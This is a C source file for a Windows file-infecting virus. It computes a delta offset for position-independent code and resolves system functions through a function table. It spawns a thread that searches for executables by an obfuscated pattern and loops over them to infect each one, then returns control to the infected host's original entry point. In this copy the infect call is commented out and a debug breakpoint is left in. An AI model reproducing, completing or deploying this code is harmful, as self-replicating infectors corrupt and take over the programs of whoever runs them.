#include <stdint.h>
#include <stdio.h>
#include <windows.h>

#include "checksum.h"
#include "checksum_list.h"
#include "code_begin.h"
#include "code_end.h"
#include "data.h"
#include "infect.h"
#include "infection_thread.h"
#include "oep.h"
#include "utility.h"
#include "string_generator.h"

static DWORD WINAPI run(LPVOID param);

void spawn_infection_thread(void) {
    data_t data;

    if (init_data(&data, (void *)code_begin, (void *)code_end,
                  (void *)spawn_infection_thread) == 0) {
        PRINT_DEBUG("delta offset is 0x%X", data.delta_offset);
        asm("int3"); // TODO BEWARE OF ME!
        HANDLE hThread = data.function_list.create_thread(
            NULL, 0,
            (LPTHREAD_START_ROUTINE)((uint8_t *)run + data.delta_offset), NULL,
            0, NULL);
        asm("nop\nnop\nnop");
        if (hThread == INVALID_HANDLE_VALUE) {
            PRINT_DEBUG("could not create thread");
        }
    } else {
        PRINT_DEBUG("failed to initialize data");
    }
    size_t oep = get_original_entry_point();
    if (oep != OEP_DEFAULT) {
        asm volatile("push %0\nret" : : "r"(oep));
    }
}

static DWORD WINAPI run(LPVOID param) {
    data_t data;
    PRINT_DEBUG("infection thread started");

    if (init_data(&data, (void *)code_begin, (void *)code_end,
                  (void *)spawn_infection_thread) == 0) {
        WIN32_FIND_DATAA find_data;
        HANDLE h_find;
        char search_pattern[20];
        if (get_string(STRING_EXE_SEARCH_PATTERN, search_pattern, 20) == 0) {
            PRINT_DEBUG("could not get string for STRING_EXE_SEARCH_PATTERN");
        }

        memzero(&find_data, sizeof(WIN32_FIND_DATAA));
        h_find = data.function_list.find_first_file_a(search_pattern, &find_data);
        if (h_find != INVALID_HANDLE_VALUE) {
            do {
                PRINT_DEBUG("infecting %s...", find_data.cFileName);
                /*if (infect(find_data.cFileName, &data) == 0)
                    PRINT_DEBUG("success!\n");
                else {
                    PRINT_DEBUG("failure!\n");
                }*/
            } while (data.function_list.find_next_file_a(h_find, &find_data));
            data.function_list.find_close(h_find);
        }
    } else {
        PRINT_DEBUG("failed to initialize data");
    }
    PRINT_DEBUG("infection thread finished");
    // data.function_list.exit_process(0);
    return 0;
}
